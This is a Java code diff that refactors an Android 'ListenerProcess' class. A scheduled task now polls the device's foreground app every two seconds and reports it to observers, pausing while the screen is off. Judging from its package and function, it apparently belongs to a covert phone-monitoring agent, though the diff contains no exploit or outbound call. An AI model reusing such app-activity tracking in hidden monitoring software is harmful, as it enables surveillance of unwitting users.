@@ -11,13 +11,17 @@ package com.android.dvci.listener;
 
 import java.util.ArrayList;
 import java.util.TreeMap;
+import java.util.concurrent.ScheduledFuture;
+import java.util.concurrent.TimeUnit;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
+import android.view.ViewDebug;
 
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.ProcessStatus;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Standby;
+import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.util.Check;
@@ -26,20 +30,19 @@ import com.android.dvci.util.StringUtils;
 public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
 	/** The Constant TAG. */
 	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
+	private static final long PERIOD = 2000;
 
-	private BroadcastMonitorProcess processReceiver;
-	//TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
-	//TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
-	//String currentForeground;
 	String lastForeground = "";
 
 	private boolean started;
+	BroadcastMonitorProcess bmp = new BroadcastMonitorProcess();
 
 	private Object standbyLock = new Object();
 	private Object startedLock = new Object();
 
 	/** The singleton. */
 	private volatile static ListenerProcess singleton;
+	private ScheduledFuture<?> future;
 
 	/**
 	 * Self.
@@ -60,7 +63,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 	public ListenerProcess() {
 		super();
-		
+
 		synchronized (standbyLock) {
 			ListenerStandby.self().attach(this);
 			setSuspended(!ListenerStandby.isScreenOn());
@@ -78,12 +81,8 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 					}
 					
 					started = true;
+					this.future = Status.getStpe().scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);
 
-					processReceiver = new BroadcastMonitorProcess();
-					processReceiver.start();
-					processReceiver.register(this);
-					
-					//dispatch(new ProcessInfo("", ProcessStatus.START));
 				}else{
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (start): screen off");
@@ -108,11 +107,11 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				}
 				
 				started = false;
-				
-				if (processReceiver != null) {
+
+				if (this.future != null) {
 					//dispatch(new ProcessInfo("", ProcessStatus.STOP));
-					processReceiver.unregister();
-					processReceiver = null;
+					this.future.cancel(true);
+					this.future = null;
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -164,5 +163,28 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 		return 0;
 	}
+
+
+	class BroadcastMonitorProcess implements Runnable {
+
+		/**
+		 * The Constant TAG.
+		 */
+		private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
+
+		@Override
+		public  void run() {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (run)");
+			}
+			StackTraceElement[] stacktrace = (new Exception()).getStackTrace();
+			for (int i = 0; i < stacktrace.length; i++) {
+				StackTraceElement el  = stacktrace[i];
+				el.getClassName();
+			}
+			dispatch(Status.self().getForeground());
+		}
+
+	};
 
 }
